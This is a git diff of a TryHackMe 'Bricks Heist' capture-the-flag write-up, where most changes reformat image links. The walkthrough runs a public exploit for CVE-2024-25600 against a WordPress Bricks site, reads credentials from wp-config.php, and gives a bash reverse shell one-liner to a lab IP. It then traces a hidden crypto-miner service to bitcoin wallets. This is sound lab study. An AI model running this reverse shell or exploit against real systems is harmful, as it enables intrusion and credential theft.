@@ -1,4 +1,4 @@
-![[Screenshots/Pasted image 20251111003614.png]]
+![](Screenshots/Pasted%20image%2020251111003614.png)
 
 
 ```bash 
@@ -21,9 +21,9 @@ server: Apache
 
 ```
 
-![[Screenshots/Pasted image 20251111004309.png]]
+![](Screenshots/Pasted%20image%2020251111004309.png)
 
-![[Screenshots/Pasted image 20251111004209.png]]
+![](Screenshots/Pasted%20image%2020251111004209.png)
 
 
 
@@ -58,7 +58,7 @@ u = users, vt = vulnerable themes, ap = all plugins. WPScan may ask for an API t
 
 
 
-We will run the exploit in this repo: https://github.com/so1icitx/CVE-2024-25600: 
+We will run the exploit of this repo: https://github.com/so1icitx/CVE-2024-25600: 
 ```bash
 ┌──(javnievic㉿kali)-[~/kali-lab/Tryhackme/machines/TryHack3M:-Bricks-Heist]
 └─$ ls                                                      
@@ -86,11 +86,12 @@ Exploiting it:
 # 
 ```
 
-![[Screenshots/Pasted image 20251111112122.png]]
+![](Screenshots/Pasted%20image%2020251111112122.png)
 
 Firstly we prove the wp-config.php file:
 
-![[Screenshots/Pasted image 20251111112046.png]]
+![](Screenshots/Pasted%20image%2020251111112046.png)
+
 We discovered the root user paswd.
 We also can do a reverse shell: 
 `bash -c 'exec bash -i &>/dev/tcp/10.8.87.146/4444 <&1'`
@@ -100,12 +101,12 @@ We can access to the db "https://bricks.thm/phpmyadmin",
 We have to view al the service running:
 `systemctl list-units --type=service --state=running`
 
-![[Screenshots/Pasted image 20251111195132.png]]
+![](Screenshots/Pasted%20image%2020251111195132.png)
 
 We check the status of the strange "ubuntu.service"
 `systemctl status ubuntu.service`
 
-![[Screenshots/Pasted image 20251111195834.png]]
+![](Screenshots/Pasted%20image%2020251111195834.png)
 
 ```bash 
 apache@ip-10-10-3-158:/data/www/default$ ls /lib/NetworkManager
@@ -130,16 +131,16 @@ system-connections
 The log file of the nm-inet-dialog is inet.conf:
 `apache@ip-10-10-3-158:/lib/NetworkManager$ cat inet.conf`
 
-![[Screenshots/Pasted image 20251111201839.png]]
+![](Screenshots/Pasted%20image%2020251111201839.png)
 
 We have the id "5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
 ":
 
 Decoding it in cyberchef: 
-![[Screenshots/Pasted image 20251111210709.png]]
+![](Screenshots/Pasted%20image%2020251111210709.png)
 
 
 bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
 
 Checking both (https://bitref.com/):
-![[Screenshots/Pasted image 20251111210935.png]]
+![](Screenshots/Pasted%20image%2020251111210935.png)
